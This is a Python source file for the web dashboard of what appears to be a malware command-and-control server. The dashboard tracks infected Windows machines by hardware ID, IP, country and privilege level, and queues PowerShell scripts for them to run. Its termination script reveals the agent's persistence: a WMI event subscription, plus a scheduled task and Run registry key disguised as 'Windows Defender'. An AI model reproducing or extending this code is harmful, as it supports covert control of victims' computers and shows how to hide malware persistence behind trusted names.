import asyncio
from quart import render_template, request, redirect, url_for, jsonify
import aiosqlite

from util.blacklist.ip_blacklist import black_list_ip
from util.system.stats import get_system_stats
from util.db.user_queries import get_users, get_user_count
from util.helpers.time_format import format_time_ago
from util.pagination import create_pagination_info
from config import DATABASE


def create_cleanup_script(hwid):
    """Create a PowerShell cleanup script for agent termination"""
    # Use a simpler approach to avoid PowerShell syntax issues in Python f-strings
    script_lines = [
        "# Agent Self-Termination Script",
        'Write-Host "[DEBUG] Agent termination script received" -ForegroundColor Red',
        "",
        "# Method 1: Create a termination flag file that the main agent can check",
        f'$terminationFlag = "$env:TEMP\\{hwid}.flag"',
        '"TERMINATE" | Out-File -FilePath $terminationFlag -Force',
        'Write-Host "[DEBUG] Termination flag created: $terminationFlag" -ForegroundColor Red',
        "",
        "# Method 2: Clean up all persistence mechanisms before termination",
        'Write-Host "[DEBUG] Cleaning up persistence mechanisms..." -ForegroundColor Red',
        "",
        "# Remove WMI Persistence",
        "try {",
        "    $EventFilterName = 'Cleanup'",
        "    $EventConsumerName = 'DataCleanup'",
        "    ",
        "    # Remove FilterToConsumerBinding",
        '    $bindings = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name=\'$EventFilterName\'"""',
        "    foreach ($binding in $bindings) {",
        "        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue",
        "    }",
        "    ",
        "    # Remove Event Consumer",
        "    $consumers = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = '$EventConsumerName'\"",
        "    foreach ($consumer in $consumers) {",
        "        Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue",
        "    }",
        "    ",
        "    # Remove Event Filter",
        "    $filters = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = '$EventFilterName'\"",
        "    foreach ($filter in $filters) {",
        "        Remove-WmiObject -InputObject $filter -ErrorAction SilentlyContinue",
        "    }",
        "    ",
        '    Write-Host "[DEBUG] WMI persistence cleaned up" -ForegroundColor Red',
        "} catch {",
        '    Write-Host "[DEBUG] WMI cleanup error: $($_.Exception.Message)" -ForegroundColor Red',
        "}",
        "",
        "# Remove Task Scheduler Persistence",
        "try {",
        '    $taskName = "Windows Defender"',
        "    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue",
        '    Write-Host "[DEBUG] Task Scheduler persistence cleaned up" -ForegroundColor Red',
        "} catch {",
        '    Write-Host "[DEBUG] Task cleanup error: $($_.Exception.Message)" -ForegroundColor Red',
        "}",
        "",
        "# Remove Registry Persistence",
        "try {",
        '    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
        '    $regName = "WindowsDefender"',
        "    Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue",
        '    Write-Host "[DEBUG] Registry persistence cleaned up" -ForegroundColor Red',
        "} catch {",
        '    Write-Host "[DEBUG] Registry cleanup error: $($_.Exception.Message)" -ForegroundColor Red',
        "}",
        "",
        "# Remove specific persistence files but keep the directory",
        "try {",
        "    $scriptDir = Join-Path $env:APPDATA '$russiantakeover-init'",
        "    if (Test-Path $scriptDir) {",
        "        # Remove specific files only",
        "        $filesToRemove = @(",
        "            Join-Path $scriptDir '$russiantakeover-init2.ps1',",
        "            Join-Path $scriptDir '$russiantakeover-init1.vbs',",
        "            Join-Path $scriptDir '.russia'",
        "        )",
        "        ",
        "        foreach ($file in $filesToRemove) {",
        "            if (Test-Path $file) {",
        "                Remove-Item -Path $file -Force -ErrorAction SilentlyContinue",
        "            }",
        "        }",
        '        Write-Host "[DEBUG] Specific persistence files cleaned up" -ForegroundColor Red',
        "    }",
        "} catch {",
        '    Write-Host "[DEBUG] File cleanup error: $($_.Exception.Message)" -ForegroundColor Red',
        "}",
        "",
        "# Method 3: Kill PowerShell processes that might be running this agent",
        "# Get all PowerShell processes and check their command line for our agent ID",
        '$processes = Get-Process -Name "powershell*" -ErrorAction SilentlyContinue',
        "foreach ($proc in $processes) {",
        "    try {",
        "        $cmdLine = (Get-WmiObject Win32_Process -Filter \"ProcessId = $($proc.Id)\").CommandLine",
        f"        if ($cmdLine -and ($cmdLine -like \"*{hwid}*\" -or $cmdLine -like \"*main.ps1*\")) {{",
        '            Write-Host "[DEBUG] Terminating agent process: $($proc.Id)" -ForegroundColor Red',
        "            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue",
        "        }",
        "    } catch {",
        "        # Ignore errors when checking process command line",
        "    }",
        "}",
        "",
        "# Method 4: Kill any PowerShell processes running from the same directory as this script",
        "$scriptDir = Split-Path -Parent $PSCommandPath",
        '$processes = Get-Process -Name "powershell*" -ErrorAction SilentlyContinue',
        "foreach ($proc in $processes) {",
        "    try {",
        "        $cmdLine = (Get-WmiObject Win32_Process -Filter \"ProcessId = $($proc.Id)\").CommandLine",
        "        if ($cmdLine -and $cmdLine -like \"*$scriptDir*\") {",
        '            Write-Host "[DEBUG] Terminating script process: $($proc.Id)" -ForegroundColor Red',
        "            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue",
        "        }",
        "    } catch {",
        "        # Ignore errors",
        "    }",
        "}",
        "",
        'Write-Host "[DEBUG] Agent termination script completed" -ForegroundColor Red'
    ]
    
    return "\n".join(script_lines)


def register_dashboard_routes(app):
    """Register dashboard routes with the app"""

    @app.route("/")
    @app.route("/dashboard")
    @black_list_ip()
    async def dashboard():

        try:
            page = int(request.args.get("page", 1))
            if page < 1:
                page = 1
        except (TypeError, ValueError):
            page = 1

        search_term = request.args.get("search", None)

        per_page = 10
        offset = (page - 1) * per_page

        sort_by = request.args.get("sort", "id")
        order = request.args.get("order", "asc")

        allowed_columns = [
            "id",
            "pcname",
            "ip_address",
            "country",
            "last_ping",
            "first_ping",
            "is_active",
            "hwid",
            "hostname",
            "elevated_status",
        ]
        if sort_by not in allowed_columns:
            sort_by = "id"

        if order not in ["asc", "desc"]:
            order = "asc"

        users, total = await asyncio.gather(
            get_users(offset, per_page, sort_by, order, search_term),
            get_user_count(search_term),
        )

        for user in users:
            user["last_ping_formatted"] = format_time_ago(user["last_ping"])
            user["first_ping_formatted"] = format_time_ago(user["first_ping"])

        system_stats = get_system_stats()

        pagination = create_pagination_info(page, per_page, total)

        return await render_template(
            "dashboard.html",
            users=users,
            pagination=pagination,
            active_page="dashboard",
            current_sort=sort_by,
            current_order=order,
            system_stats=system_stats,
            total_users=total,
            search_term=search_term,
        )

    @app.route("/delete_user/<int:user_id>", methods=["POST"])
    @black_list_ip()
    async def delete_user(user_id):
        """Delete a user from the database"""
        try:
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row

                cursor = await db.execute(
                    "SELECT hwid, pcname FROM user WHERE id = ?", (user_id,)
                )
                user = await cursor.fetchone()

                if not user:
                    return (
                        jsonify({"status": "error", "message": "User not found"}),
                        404,
                    )

                hwid = user["hwid"]

                pending_delete_name = f"PENDING_DELETION_{user['pcname']}"
                current_time = int(asyncio.get_event_loop().time())
                grace_period_end = current_time + 60  # 60 seconds from now
                
                await db.execute(
                    "UPDATE user SET pcname = ?, last_ping = ? WHERE id = ?",
                    (pending_delete_name, grace_period_end, user_id),
                )

                if hwid:

                    # Create a more targeted cleanup script that can identify and terminate the specific agent
                    cleanup_script = create_cleanup_script(hwid)

                    await db.execute(
                        """
                        INSERT INTO scripts (name, content, is_global, user_id, executed, startup, is_system)
                        VALUES (?, ?, 0, ?, 0, 1, 1)
                        """,
                        ("Agent Termination", cleanup_script, user_id),
                    )

                    await db.commit()

                    return jsonify(
                        {
                            "status": "success",
                            "message": "User marked for deletion, cleanup initiated. 60-second grace period for re-registration blocking.",
                        }
                    )
                else:

                    await db.execute(
                        "DELETE FROM scripts WHERE user_id = ?", (user_id,)
                    )
                    await db.execute("DELETE FROM user WHERE id = ?", (user_id,))
                    await db.commit()

                    return jsonify(
                        {"status": "success", "message": "User deleted successfully"}
                    )

        except Exception as e:
            print(f"Error deleting user: {e}")
            return jsonify({"status": "error", "message": str(e)}), 500

    return app
